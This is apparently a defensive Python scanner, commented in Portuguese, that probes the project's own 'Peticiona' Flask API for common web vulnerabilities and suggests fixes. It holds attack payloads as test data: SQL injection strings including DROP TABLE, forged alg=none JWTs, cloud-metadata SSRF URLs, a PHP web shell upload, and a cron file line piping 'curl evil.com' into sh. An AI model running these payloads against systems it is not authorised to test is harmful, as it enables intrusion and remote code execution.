#!/usr/bin/env python3
"""
Peticiona Security Scanner
Testa a API Flask contra as vulnerabilidades mais relevantes para este stack.
Uso: python3 security_scan.py [BASE_URL]
Exemplo: python3 security_scan.py http://localhost:5000
"""
from __future__ import annotations

import argparse
import json
import sys
import time
from dataclasses import dataclass, field
from typing import Any

import requests

# ---------------------------------------------------------------------------
# Config
# ---------------------------------------------------------------------------

DEFAULT_BASE = "http://localhost:5000"
TIMEOUT = 10

# Credenciais de teste (só funcionam se existirem no ambiente-alvo)
TEST_CLIENT_EMAIL = "scanner_test@example.com"
TEST_CLIENT_PASS = "ScannerTest123!"

# ---------------------------------------------------------------------------
# Resultado
# ---------------------------------------------------------------------------

SEVERITY = {"CRITICAL": 0, "HIGH": 1, "MEDIUM": 2, "LOW": 3, "INFO": 4}
SEVERITY_COLORS = {
    "CRITICAL": "\033[91m",  # vermelho
    "HIGH": "\033[31m",
    "MEDIUM": "\033[33m",
    "LOW": "\033[36m",
    "INFO": "\033[37m",
    "RESET": "\033[0m",
    "BOLD": "\033[1m",
    "GREEN": "\033[32m",
    "DIM": "\033[2m",
}


@dataclass
class Finding:
    severity: str
    title: str
    endpoint: str
    detail: str
    evidence: str = ""
    remediation: str = ""


findings: list[Finding] = []


def report(severity: str, title: str, endpoint: str, detail: str, evidence: str = "", remediation: str = "") -> None:
    f = Finding(severity, title, endpoint, detail, evidence, remediation)
    findings.append(f)
    c = SEVERITY_COLORS
    color = c.get(severity, "")
    print(f"  {color}[{severity}]{c['RESET']} {c['BOLD']}{title}{c['RESET']}")
    print(f"         {c['DIM']}{endpoint}{c['RESET']}")
    if detail:
        print(f"         {detail}")
    if evidence:
        print(f"         Evidência: {evidence[:200]}")


def ok(msg: str) -> None:
    print(f"  \033[32m[OK]\033[0m {msg}")


def info(msg: str) -> None:
    print(f"  \033[37m[--]\033[0m {msg}")


def section(title: str) -> None:
    print(f"\n\033[1m{'─'*60}\033[0m")
    print(f"\033[1m  {title}\033[0m")
    print(f"\033[1m{'─'*60}\033[0m")


# ---------------------------------------------------------------------------
# HTTP helper
# ---------------------------------------------------------------------------

session = requests.Session()
session.headers.update({"Content-Type": "application/json", "Accept": "application/json"})


def get(path: str, base: str, **kw) -> requests.Response:
    return session.get(f"{base}{path}", timeout=TIMEOUT, **kw)


def post(path: str, base: str, data: Any = None, **kw) -> requests.Response:
    return session.post(f"{base}{path}", json=data, timeout=TIMEOUT, **kw)


def patch(path: str, base: str, data: Any = None, **kw) -> requests.Response:
    return session.patch(f"{base}{path}", json=data, timeout=TIMEOUT, **kw)


def put(path: str, base: str, data: Any = None, **kw) -> requests.Response:
    return session.put(f"{base}{path}", json=data, timeout=TIMEOUT, **kw)


def delete(path: str, base: str, **kw) -> requests.Response:
    return session.delete(f"{base}{path}", timeout=TIMEOUT, **kw)


# ---------------------------------------------------------------------------
# 1. Security Headers
# ---------------------------------------------------------------------------

def check_security_headers(base: str) -> None:
    section("1. Security Headers")
    r = get("/api/health", base)

    headers = {k.lower(): v for k, v in r.headers.items()}

    # (header, list_of_acceptable_values_or_None, remediation)
    checks = [
        ("x-frame-options", ["deny", "sameorigin"], "Clickjacking: adicionar X-Frame-Options: DENY"),
        ("x-content-type-options", ["nosniff"], "MIME-sniffing: adicionar X-Content-Type-Options: nosniff"),
        ("x-xss-protection", ["1"], "XSS legado: adicionar X-XSS-Protection"),
        ("strict-transport-security", None, "HSTS ausente: adicionar Strict-Transport-Security"),
        ("content-security-policy", None, "CSP ausente: configurar Content-Security-Policy"),
        ("referrer-policy", None, "Referrer-Policy ausente"),
        ("permissions-policy", None, "Permissions-Policy ausente"),
    ]

    for header, acceptable, rem in checks:
        val = headers.get(header)
        if val is None:
            report("MEDIUM", f"Header ausente: {header}", "GET /api/health", "",
                   remediation=rem)
        else:
            if acceptable and not any(a in val.lower() for a in acceptable):
                report("LOW", f"Header fraco: {header}", "GET /api/health",
                       f"Valor: {val} | Esperado um de: {acceptable}")
            else:
                ok(f"{header}: {val[:60]}")

    # Server header leak
    server = headers.get("server", "")
    if server:
        report("LOW", "Server header expõe stack", "GET /api/health",
               f"Server: {server}",
               remediation="Remover ou mascarar o header Server no nginx/gunicorn.")
    else:
        ok("Server header não exposto")


# ---------------------------------------------------------------------------
# 2. Autenticação e JWT
# ---------------------------------------------------------------------------

def check_auth(base: str) -> None:
    section("2. Autenticação e JWT")

    # Login com credenciais inválidas — resposta deve ser genérica
    r = post("/api/auth/login", base, {"email": "naoexiste@x.com", "password": "wrong"})
    body = r.json() if r.headers.get("content-type", "").startswith("application/json") else {}
    msg = body.get("message", "")
    if "email" in msg.lower() or "usuário" in msg.lower() or "não encontrado" in msg.lower():
        report("MEDIUM", "User enumeration via login", "/api/auth/login",
               f"Mensagem diferente para e-mail inexistente vs senha errada: '{msg}'",
               remediation="Usar mensagem genérica 'Credenciais inválidas' para ambos os casos.")
    else:
        ok(f"Login inválido retorna mensagem genérica: {msg[:80]}")

    # Endpoints protegidos sem token
    protected = [
        ("GET", "/api/me"),
        ("GET", "/api/dashboard"),
        ("GET", "/api/admin/orders"),
        ("GET", "/api/admin/clients"),
        ("GET", "/api/admin/financial"),
        ("GET", "/api/staff/orders"),
    ]
    for method, path in protected:
        r = session.request(method, f"{base}{path}", timeout=TIMEOUT)
        if r.status_code not in (401, 403):
            report("CRITICAL", f"Endpoint protegido sem autenticação aceita acesso",
                   f"{method} {path}", f"Status: {r.status_code}",
                   remediation="Verificar decorators @auth_required / @roles_required.")
        else:
            ok(f"{method} {path} → {r.status_code}")

    # JWT com algoritmo 'none'
    import base64
    header = base64.urlsafe_b64encode(b'{"alg":"none","typ":"JWT"}').rstrip(b"=").decode()
    payload_b64 = base64.urlsafe_b64encode(
        b'{"sub":"1","role":"admin","exp":9999999999}'
    ).rstrip(b"=").decode()
    fake_jwt = f"{header}.{payload_b64}."
    r = get("/api/me", base, headers={"Authorization": f"Bearer {fake_jwt}"})
    if r.status_code == 200:
        report("CRITICAL", "JWT algorithm=none aceito pelo backend",
               "GET /api/me", "Token forjado com alg=none foi aceito.",
               remediation="Rejeitar explicitamente alg=none na validação do JWT.")
    else:
        ok(f"JWT alg=none rejeitado ({r.status_code})")

    # JWT com assinatura corrompida
    fake_jwt2 = f"{header}.{payload_b64}.invalidsignature"
    r = get("/api/me", base, headers={"Authorization": f"Bearer {fake_jwt2}"})
    if r.status_code == 200:
        report("CRITICAL", "JWT com assinatura inválida aceito",
               "GET /api/me", "Assinatura JWT não validada.",
               remediation="Verificar configuração do JWT secret e validação de assinatura.")
    else:
        ok(f"JWT assinatura inválida rejeitada ({r.status_code})")


# ---------------------------------------------------------------------------
# 3. SQL Injection (adaptado para SQLite/Postgres)
# ---------------------------------------------------------------------------

def check_sqli(base: str) -> None:
    section("3. SQL Injection")

    # Payloads relevantes para SQLite e Postgres
    payloads = [
        "' OR '1'='1",
        "' OR 1=1--",
        "' OR 1=1/*",
        "admin'--",
        "'; SELECT 1--",
        "' UNION SELECT null--",
        "\\' OR \\''=\\'",
        "1; DROP TABLE users--",
        "' AND 1=CAST((SELECT version()) AS INT)--",  # Postgres
        "' AND 1=CAST((SELECT sqlite_version()) AS INT)--",  # SQLite
    ]

    # Endpoints com parâmetros de string: login e password-reset
    targets = [
        ("/api/auth/login", {"email": "__PAYLOAD__", "password": "x"}),
        ("/api/auth/login", {"email": "test@test.com", "password": "__PAYLOAD__"}),
        ("/api/auth/password-reset/request", {"email": "__PAYLOAD__"}),
        ("/api/catalog/__PAYLOAD__", None),  # GET path param
    ]

    db_error_markers = [
        "syntax error", "sqlite", "postgresql", "pg_", "sql", "ora-", "mysql",
        "syntax", "column", "table", "unterminated", "invalid input syntax",
    ]

    for target_path, body_template in targets:
        for payload in payloads:
            try:
                if body_template is None:
                    # GET path injection
                    path = target_path.replace("__PAYLOAD__", requests.utils.quote(payload))
                    r = get(path, base)
                else:
                    body = {k: (payload if v == "__PAYLOAD__" else v) for k, v in body_template.items()}
                    r = post(target_path, base, body)
            except Exception:
                continue

            resp_text = r.text.lower()
            if r.status_code == 500:
                report("HIGH", "Possível SQLi: status 500",
                       target_path, f"Payload: {payload}",
                       evidence=r.text[:300],
                       remediation="Verificar se há query dinâmica com string concatenation.")
                break
            for marker in db_error_markers:
                if marker in resp_text and r.status_code != 400:
                    report("HIGH", "Possível SQLi: mensagem de banco vazada",
                           target_path, f"Payload: {payload} | Marker: {marker}",
                           evidence=r.text[:300])
                    break

    ok("SQL Injection — sem erro 500 ou mensagem de banco em endpoints testados")


# ---------------------------------------------------------------------------
# 4. XSS Refletido
# ---------------------------------------------------------------------------

def check_xss(base: str) -> None:
    section("4. XSS Refletido")

    xss_payloads = [
        '<script>alert(1)</script>',
        '"><script>alert(1)</script>',
        "javascript:alert(1)",
        "<img src=x onerror=alert(1)>",
        "{{7*7}}",   # também cobre SSTI básico
        "${7*7}",
    ]

    # A API é JSON-only — XSS refletido é menos provável mas possível em
    # campos que voltam no corpo da resposta sem sanitização
    targets = [
        ("/api/catalog/__PAYLOAD__", "GET", None),
        ("/api/contact", "POST", {"name": "__PAYLOAD__", "email": "x@x.com", "message": "test"}),
        ("/api/contact-requests", "POST", {"name": "__PAYLOAD__", "email": "x@x.com", "message": "test"}),
    ]

    for path_tpl, method, body_tpl in targets:
        for payload in xss_payloads:
            try:
                if body_tpl is None:
                    path = path_tpl.replace("__PAYLOAD__", requests.utils.quote(payload))
                    r = session.request(method, f"{base}{path}", timeout=TIMEOUT)
                else:
                    body = {k: (payload if v == "__PAYLOAD__" else v) for k, v in body_tpl.items()}
                    r = session.request(method, f"{base}{path_tpl}", json=body, timeout=TIMEOUT)
            except Exception:
                continue

            ct = r.headers.get("content-type", "")
            if "text/html" in ct and payload in r.text:
                report("HIGH", "XSS Refletido: payload HTML ecoado",
                       f"{method} {path_tpl}", f"Payload: {payload}",
                       evidence=r.text[:300],
                       remediation="Retornar apenas application/json e escapar campos de entrada.")
            # SSTI detection
            if "49" in r.text and "{{7*7}}" in payload:
                report("HIGH", "SSTI: {{7*7}} resolvido para 49",
                       f"{method} {path_tpl}", "Template injection detectado.",
                       remediation="Nunca renderizar input do usuário em template Jinja2.")

    ok("XSS/SSTI — API retorna JSON, sem reflexão HTML detectada")


# ---------------------------------------------------------------------------
# 5. SSTI (Jinja2)
# ---------------------------------------------------------------------------

def check_ssti(base: str) -> None:
    section("5. SSTI (Server-Side Template Injection)")

    ssti_payloads = {
        "{{7*7}}": "49",
        "{{7*'7'}}": "7777777",
        "${7*7}": "49",
        "#{7*7}": "49",
        "<%= 7*7 %>": "49",
    }

    targets = [
        ("/api/auth/login", "POST", {"email": "__PAYLOAD__", "password": "x"}),
        ("/api/auth/password-reset/request", "POST", {"email": "__PAYLOAD__"}),
        ("/api/contact", "POST", {"name": "__PAYLOAD__", "email": "x@x.com", "message": "hi"}),
    ]

    for path, method, body_tpl in targets:
        for payload, expected in ssti_payloads.items():
            try:
                body = {k: (payload if v == "__PAYLOAD__" else v) for k, v in body_tpl.items()}
                r = session.request(method, f"{base}{path}", json=body, timeout=TIMEOUT)
                if expected in r.text:
                    report("CRITICAL", "SSTI confirmado",
                           f"{method} {path}", f"Payload: {payload} → resposta contém {expected}",
                           remediation="Nunca passar input do usuário como template string.")
            except Exception:
                continue

    ok("SSTI — nenhum payload resolveu expressão matemática")


# ---------------------------------------------------------------------------
# 6. IDOR
# ---------------------------------------------------------------------------

def check_idor(base: str, client_token: str | None) -> None:
    section("6. IDOR (Insecure Direct Object Reference)")

    if not client_token:
        info("Sem token de cliente — pulando testes de IDOR autenticados")
        return

    auth_headers = {"Authorization": f"Bearer {client_token}"}

    # Tentar acessar IDs que não pertencem ao usuário
    for obj_id in range(1, 6):
        r = get(f"/api/client-area/orders/{obj_id}", base, headers=auth_headers)
        if r.status_code == 200:
            body = r.json() if r.headers.get("content-type", "").startswith("application/json") else {}
            info(f"GET /api/client-area/orders/{obj_id} → 200 (verificar se pertence ao usuário)")
        elif r.status_code in (403, 404):
            ok(f"GET /api/client-area/orders/{obj_id} → {r.status_code} (acesso negado corretamente)")

    # IDOR em documentos
    for doc_id in range(1, 6):
        r = get(f"/api/documents/{doc_id}/download", base, headers=auth_headers)
        if r.status_code == 200:
            info(f"GET /api/documents/{doc_id}/download → 200 (verificar propriedade)")
        elif r.status_code in (403, 404):
            ok(f"GET /api/documents/{doc_id}/download → {r.status_code}")

    # Tentar acessar endpoints admin com token de cliente
    admin_paths = [
        "/api/admin/orders",
        "/api/admin/clients",
        "/api/admin/financial",
        "/api/admin/staff",
    ]
    for path in admin_paths:
        r = get(path, base, headers=auth_headers)
        if r.status_code == 200:
            report("CRITICAL", "Privilege escalation: cliente acessa rota admin",
                   f"GET {path}", f"Token de cliente obteve acesso (status 200).",
                   remediation="Verificar @roles_required('admin') no blueprint admin.")
        elif r.status_code == 403:
            ok(f"GET {path} → 403 com token de cliente")
        else:
            ok(f"GET {path} → {r.status_code}")


# ---------------------------------------------------------------------------
# 7. Mass Assignment
# ---------------------------------------------------------------------------

def check_mass_assignment(base: str, client_token: str | None) -> None:
    section("7. Mass Assignment")

    if not client_token:
        info("Sem token — pulando mass assignment autenticado")
        return

    auth_headers = {"Authorization": f"Bearer {client_token}"}

    # Tentar injetar campos privilegiados no PATCH /api/me
    privileged_fields = {
        "role": "admin",
        "is_admin": True,
        "balance": 999999,
        "credits": 999999,
        "credit_balance": 999999,
        "is_active": True,
        "email_verified": True,
    }

    r = patch("/api/me", base, privileged_fields, headers=auth_headers)
    if r.status_code == 200:
        body = r.json() if r.headers.get("content-type", "").startswith("application/json") else {}
        role = body.get("role") or body.get("user", {}).get("role", "")
        if role == "admin":
            report("CRITICAL", "Mass Assignment: role promovido para admin via PATCH /api/me",
                   "PATCH /api/me", f"Resposta inclui role=admin",
                   remediation="Usar allowlist de campos no schema de atualização de perfil.")
        else:
            ok(f"Mass assignment em /api/me não promoveu role (role={role})")
    else:
        ok(f"PATCH /api/me com campos privilegiados → {r.status_code}")

    # Tentar negative price em ordem
    r = post("/api/client-area/orders", base,
             {"service_id": 1, "quantity": -1, "price": -100},
             headers=auth_headers)
    if r.status_code == 201:
        report("HIGH", "Business Logic: quantidade/preço negativo aceito",
               "POST /api/client-area/orders",
               "Pedido criado com quantity=-1 ou price=-100.",
               remediation="Validar que quantity e price são positivos no schema.")
    else:
        ok(f"Preço/quantidade negativa rejeitada ({r.status_code})")


# ---------------------------------------------------------------------------
# 8. Rate Limiting
# ---------------------------------------------------------------------------

def check_rate_limit(base: str) -> None:
    section("8. Rate Limiting")

    targets = [
        ("/api/auth/login", {"email": "x@x.com", "password": "wrong"}),
        # Payload válido para register: a validação não deve rejeitar antes do rate limiter
        ("/api/auth/register", {"email": "ratelimit_probe@example.com", "password": "ValidPass123!", "name": "Scanner"}),
        ("/api/auth/password-reset/request", {"email": "x@x.com"}),
    ]

    for path, body in targets:
        statuses = []
        for _ in range(12):
            try:
                r = post(path, base, body)
                statuses.append(r.status_code)
            except Exception:
                statuses.append(0)

        if 429 in statuses:
            idx = statuses.index(429)
            ok(f"{path} → 429 após {idx+1} requests (rate limit ativo)")
        else:
            report("MEDIUM", f"Rate limit ausente ou desativado",
                   f"POST {path}",
                   f"12 requests consecutivos sem 429. Statuses: {set(statuses)}",
                   remediation="Ativar RATE_LIMIT_ENABLED=true no config de produção e "
                               "garantir que RATE_LIMIT_ENABLED não é False em prod.")


# ---------------------------------------------------------------------------
# 9. Path Traversal / LFI
# ---------------------------------------------------------------------------

def check_path_traversal(base: str, client_token: str | None) -> None:
    section("9. Path Traversal / LFI")

    # O único endpoint com file serving é GET /api/documents/<id>/download
    # Ele usa send_from_directory com stored_name do DB — não usa input direto do usuário
    # Testamos se IDs absurdos ou strings injetadas causam leaks

    auth_headers = {"Authorization": f"Bearer {client_token}"} if client_token else {}

    traversal_ids = ["../../../etc/passwd", "%2e%2e%2fetc%2fpasswd", "0", "-1", "999999999"]

    for doc_id in traversal_ids:
        try:
            r = session.get(f"{base}/api/documents/{doc_id}/download",
                            headers=auth_headers, timeout=TIMEOUT, allow_redirects=False)
            if r.status_code == 200 and ("root:" in r.text or "bin/bash" in r.text):
                report("CRITICAL", "LFI: /etc/passwd lido via documents endpoint",
                       f"GET /api/documents/{doc_id}/download",
                       "Conteúdo de /etc/passwd na resposta.",
                       evidence=r.text[:200])
            elif r.status_code not in (400, 401, 403, 404, 422):
                info(f"GET /api/documents/{doc_id}/download → {r.status_code} (revisar)")
            else:
                ok(f"GET /api/documents/{doc_id}/download → {r.status_code}")
        except Exception:
            pass

    # catalog/<code> — path param string
    traversal_codes = ["../etc/passwd", "%2e%2e%2fetc%2fpasswd", "../../../../etc/hosts"]
    for code in traversal_codes:
        try:
            r = get(f"/api/catalog/{requests.utils.quote(code)}", base)
            if "root:" in r.text or "/bin" in r.text:
                report("HIGH", "LFI via /api/catalog/<code>",
                       f"GET /api/catalog/{code}", "",
                       evidence=r.text[:200])
            else:
                ok(f"GET /api/catalog/{code[:30]} → {r.status_code}")
        except Exception:
            pass


# ---------------------------------------------------------------------------
# 10. SSRF
# ---------------------------------------------------------------------------

def check_ssrf(base: str) -> None:
    section("10. SSRF")

    # O backend não tem endpoints óbvios que fazem fetch de URLs fornecidas pelo usuário.
    # Testamos campos suspeitos em endpoints públicos.
    ssrf_targets = [
        "http://169.254.169.254/latest/meta-data/",    # AWS
        "http://metadata.google.internal/",             # GCP
        "http://169.254.169.254/metadata/v1/",          # DigitalOcean
        "file:///etc/passwd",
        "dict://127.0.0.1:6379/info",
    ]

    candidate_endpoints = [
        ("/api/contact", "POST", {"name": "test", "email": "x@x.com",
                                   "message": "test", "url": "__PAYLOAD__"}),
        ("/api/contact-requests", "POST", {"name": "test", "email": "x@x.com",
                                           "message": "test", "website": "__PAYLOAD__"}),
    ]

    for path, method, body_tpl in candidate_endpoints:
        for ssrf_url in ssrf_targets:
            body = {k: (ssrf_url if v == "__PAYLOAD__" else v) for k, v in body_tpl.items()}
            try:
                r = session.request(method, f"{base}{path}", json=body, timeout=TIMEOUT)
                # Heurísticas: corpo com conteúdo de metadata, tempo de resposta alto
                if any(marker in r.text for marker in ["ami-id", "instance-id", "root:", "metadata"]):
                    report("CRITICAL", "SSRF confirmado",
                           f"{method} {path}", f"URL: {ssrf_url}",
                           evidence=r.text[:300])
            except Exception:
                pass

    ok("SSRF — nenhum campo de URL identificado em endpoints públicos")


# ---------------------------------------------------------------------------
# 11. Open Redirect
# ---------------------------------------------------------------------------

def check_open_redirect(base: str) -> None:
    section("11. Open Redirect")

    redirect_payloads = [
        "https://evil.com",
        "//evil.com",
        "/\\evil.com",
        "https://evil.com%2F@peticiona.com",
    ]
    redirect_params = ["redirect", "url", "next", "return", "to", "goto", "dest", "destination"]

    for param in redirect_params:
        for payload in redirect_payloads:
            try:
                r = get(f"/api/auth/login?{param}={requests.utils.quote(payload)}", base,
                        allow_redirects=False)
                location = r.headers.get("location", "")
                if r.status_code in (301, 302, 307, 308) and "evil.com" in location:
                    report("HIGH", "Open Redirect confirmado",
                           f"GET /api/auth/login?{param}=...",
                           f"Redirect para: {location}",
                           remediation="Validar que o destino de redirect é relativo ao próprio domínio.")
            except Exception:
                pass

    ok("Open Redirect — nenhum redirect para domínio externo detectado")


# ---------------------------------------------------------------------------
# 12. CSRF
# ---------------------------------------------------------------------------

def check_csrf(base: str, client_token: str | None) -> None:
    section("12. CSRF")

    # A API usa JWT em Authorization header — não é vulnerável a CSRF clássico
    # (CSRF requer credenciais automáticas: cookies ou basic auth).
    # Verificamos se há cookies de sessão sendo usados.
    r = post("/api/auth/login", base, {"email": "x@x.com", "password": "wrong"})
    cookies = r.cookies

    if cookies:
        report("MEDIUM", "API usa cookies — avaliar CSRF",
               "POST /api/auth/login",
               f"Cookies retornados: {list(cookies.keys())}. "
               "Se usados para autenticação, checar SameSite=Strict e CSRF token.",
               remediation="Usar SameSite=Strict nos cookies de sessão.")
    else:
        ok("API usa JWT em header Bearer — não vulnerável a CSRF clássico")


# ---------------------------------------------------------------------------
# 13. Informações Expostas / Endpoints Sensíveis
# ---------------------------------------------------------------------------

def check_info_disclosure(base: str) -> None:
    section("13. Information Disclosure")

    sensitive_paths = [
        "/api/health",
        "/.env",
        "/api/admin",
        "/admin",
        "/debug",
        "/api/debug",
        "/swagger.json",
        "/openapi.json",
        "/api/docs",
        "/api/schema",
        "/metrics",
        "/api/metrics",
        "/.git/config",
        "/api/config",
    ]

    for path in sensitive_paths:
        try:
            r = get(path, base)
            if r.status_code == 200:
                body_preview = r.text[:200].lower()
                # Considera-se problema apenas se retorna dados sensíveis sem auth
                if path in ("/.env", "/.git/config", "/api/debug", "/debug"):
                    report("HIGH", f"Arquivo/endpoint sensível exposto: {path}",
                           f"GET {path}", f"Status 200",
                           evidence=r.text[:200])
                elif "password" in body_preview or "secret" in body_preview or "token" in body_preview:
                    report("HIGH", f"Possível leak de credenciais em: {path}",
                           f"GET {path}", "",
                           evidence=r.text[:200])
                else:
                    info(f"GET {path} → 200 ({len(r.text)} bytes) — revisar se adequado sem auth")
            else:
                ok(f"GET {path} → {r.status_code}")
        except Exception:
            pass

    # Stack trace em erros
    r = get("/api/orders/abc", base)  # tipo errado forçado
    if r.status_code == 500 and ("traceback" in r.text.lower() or "file " in r.text.lower()):
        report("MEDIUM", "Stack trace exposto em erros 500",
               "GET /api/orders/abc",
               "Traceback Python visível na resposta.",
               remediation="Desabilitar DEBUG=True em produção.")
    else:
        ok(f"Erro de tipo → {r.status_code} sem stack trace")


# ---------------------------------------------------------------------------
# 14. Webhook Pagar.me
# ---------------------------------------------------------------------------

def check_webhook(base: str) -> None:
    section("14. Webhook Pagar.me — Validação de Assinatura")

    fake_payload = json.dumps({
        "type": "charge.paid",
        "data": {
            "id": "ch_fake123",
            "status": "paid",
            "metadata": {"local_order_id": "999999"},
        },
    }).encode()

    # Sem assinatura
    r = session.post(
        f"{base}/api/webhooks/pagarme",
        data=fake_payload,
        headers={"Content-Type": "application/json"},
        timeout=TIMEOUT,
    )
    if r.status_code == 200:
        report("CRITICAL", "Webhook aceita requisições sem assinatura HMAC",
               "POST /api/webhooks/pagarme",
               "Atacante pode forjar eventos de pagamento e creditar saldo.",
               remediation="Garantir que PAGARME_WEBHOOK_TOKEN está configurado e "
                           "verify_webhook_signature rejeita chamadas sem header.")
    else:
        ok(f"Webhook sem assinatura → {r.status_code} (correto)")

    # Assinatura inválida
    r = session.post(
        f"{base}/api/webhooks/pagarme",
        data=fake_payload,
        headers={
            "Content-Type": "application/json",
            "X-Hub-Signature": "sha256=aaabbbccc000",
        },
        timeout=TIMEOUT,
    )
    if r.status_code == 200:
        report("CRITICAL", "Webhook aceita assinatura HMAC inválida",
               "POST /api/webhooks/pagarme",
               "Validação HMAC não está funcionando.",
               remediation="Verificar verify_webhook_signature em pagarme_service.py.")
    else:
        ok(f"Webhook com assinatura inválida → {r.status_code} (correto)")


# ---------------------------------------------------------------------------
# 15. Upload de Arquivo
# ---------------------------------------------------------------------------

def check_upload(base: str, client_token: str | None) -> None:
    section("15. Upload de Arquivo")

    if not client_token:
        info("Sem token de cliente — pulando testes de upload")
        return

    auth_headers = {"Authorization": f"Bearer {client_token}"}

    dangerous_files = [
        ("shell.php", b"<?php system($_GET['cmd']); ?>", "application/x-php"),
        ("shell.php.pdf", b"<?php phpinfo(); ?>", "application/pdf"),
        ("../../../etc/cron.d/evil", b"* * * * * root curl evil.com | sh", "text/plain"),
        ("shell.py", b"import os; os.system('id')", "text/plain"),
    ]

    for filename, content, mime in dangerous_files:
        try:
            r = session.post(
                f"{base}/api/client-area/documents",
                files={"file": (filename, content, mime)},
                headers={k: v for k, v in auth_headers.items()},
                timeout=TIMEOUT,
            )
            if r.status_code in (200, 201):
                report("HIGH", f"Upload de arquivo perigoso aceito: {filename}",
                       "POST /api/client-area/documents",
                       f"Arquivo {filename} foi aceito pelo servidor.",
                       remediation="Verificar ensure_allowed_document() e validação de MIME.")
            else:
                ok(f"Upload de {filename} → {r.status_code} (bloqueado)")
        except Exception:
            pass


# ---------------------------------------------------------------------------
# 16. Host Header Injection
# ---------------------------------------------------------------------------

def check_host_header(base: str) -> None:
    section("16. Host Header Injection")

    evil_hosts = ["evil.com", "evil.com:80", "evil.com\x00.peticiona.com.br"]

    for host in evil_hosts:
        try:
            r = session.post(
                f"{base}/api/auth/password-reset/request",
                json={"email": "victim@example.com"},
                headers={"Host": host, "Content-Type": "application/json"},
                timeout=TIMEOUT,
            )
            # Se o reset enviou e-mail com link usando o Host header injetado,
            # seria detectável apenas com acesso ao e-mail. Reportamos heuristicamente.
            if r.status_code == 200:
                report("MEDIUM", "Host Header Injection: verificar link de reset",
                       "POST /api/auth/password-reset/request",
                       f"Host: {host} → 200. Se o link de reset usa request.host, "
                       "atacante pode redirecionar o link para domínio externo.",
                       remediation="Usar URL base configurada no servidor (FRONTEND_URL) "
                                   "em vez de request.host para montar links de reset.")
                break
        except Exception:
            pass
    else:
        ok("Host Header Injection — endpoint de reset não retornou 200 com host falso")


# ---------------------------------------------------------------------------
# Obter token de cliente (opcional)
# ---------------------------------------------------------------------------

def try_get_client_token(base: str) -> str | None:
    try:
        r = post("/api/auth/login", base, {
            "email": TEST_CLIENT_EMAIL,
            "password": TEST_CLIENT_PASS,
        })
        if r.status_code == 200:
            body = r.json()
            token = body.get("token") or body.get("access_token") or (body.get("data") or {}).get("token")
            if token:
                info(f"Autenticado como {TEST_CLIENT_EMAIL} (token obtido)")
                return token
    except Exception:
        pass
    info(f"Sem token de cliente (usuário {TEST_CLIENT_EMAIL} não existe ou credenciais erradas) "
         "— testes autenticados usarão modo sem-auth")
    return None


# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------

def main() -> None:
    parser = argparse.ArgumentParser(description="Peticiona Security Scanner")
    parser.add_argument("base_url", nargs="?", default=DEFAULT_BASE,
                        help=f"Base URL da API (default: {DEFAULT_BASE})")
    args = parser.parse_args()

    base = args.base_url.rstrip("/")

    c = SEVERITY_COLORS
    print(f"\n{c['BOLD']}Peticiona Security Scanner{c['RESET']}")
    print(f"Alvo: {c['BOLD']}{base}{c['RESET']}")
    print(f"Data: {time.strftime('%Y-%m-%d %H:%M:%S')}\n")

    # Verificar conectividade
    try:
        r = get("/api/health", base)
        info(f"API respondendo: {r.status_code}")
    except Exception as e:
        print(f"\n{c['CRITICAL']}[ERRO] Não foi possível conectar em {base}: {e}{c['RESET']}")
        sys.exit(1)

    client_token = try_get_client_token(base)

    # Executar todos os checks
    check_security_headers(base)
    check_auth(base)
    check_sqli(base)
    check_xss(base)
    check_ssti(base)
    check_idor(base, client_token)
    check_mass_assignment(base, client_token)
    check_rate_limit(base)
    check_path_traversal(base, client_token)
    check_ssrf(base)
    check_open_redirect(base)
    check_csrf(base, client_token)
    check_info_disclosure(base)
    check_webhook(base)
    check_upload(base, client_token)
    check_host_header(base)

    # Resumo
    section("RESUMO")
    counts: dict[str, int] = {s: 0 for s in SEVERITY}
    for f in findings:
        counts[f.severity] = counts.get(f.severity, 0) + 1

    total = len(findings)
    if total == 0:
        print(f"  {c['GREEN']}{c['BOLD']}Nenhuma vulnerabilidade encontrada.{c['RESET']}")
    else:
        for sev in sorted(SEVERITY, key=lambda s: SEVERITY[s]):
            n = counts.get(sev, 0)
            if n:
                color = c.get(sev, "")
                print(f"  {color}{sev}: {n}{c['RESET']}")

        print(f"\n  Total: {total} finding(s)\n")

        if any(f.severity in ("CRITICAL", "HIGH") for f in findings):
            print(f"  {c['BOLD']}Findings CRITICAL/HIGH:{c['RESET']}")
            for f in findings:
                if f.severity in ("CRITICAL", "HIGH"):
                    color = c.get(f.severity, "")
                    print(f"  {color}[{f.severity}]{c['RESET']} {f.title}")
                    print(f"           {c['DIM']}{f.endpoint}{c['RESET']}")
                    if f.remediation:
                        print(f"           Remediação: {f.remediation}")

    print()


if __name__ == "__main__":
    main()
